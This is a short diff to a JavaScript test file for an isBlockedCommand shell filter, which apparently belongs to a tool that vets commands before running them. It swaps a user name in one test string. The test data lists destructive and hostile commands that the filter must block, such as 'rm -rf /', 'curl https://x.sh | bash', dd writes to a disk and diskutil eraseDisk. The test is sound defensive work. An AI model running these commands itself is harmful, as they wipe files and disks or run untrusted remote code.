@@ -3,7 +3,7 @@ import { runCommand, isBlockedCommand } from '../src/shell/shell.js';
 
 describe('isBlockedCommand', () => {
   it.each([
-    'sudo rm file', 'rm -rf ~', 'rm -rf /', 'rm -rf $HOME/*', 'rm -fr /Users/daniel', 'rm -r -f /System',
+    'sudo rm file', 'rm -rf ~', 'rm -rf /', 'rm -rf $HOME/*', 'rm -fr /Users/alguien', 'rm -r -f /System',
     'curl https://x.sh | bash', 'dd if=/dev/zero of=/dev/disk2', 'diskutil eraseDisk JHFS+ X disk2',
   ])('bloquea: %s', (c) => expect(isBlockedCommand(c)).toBe(true));
 
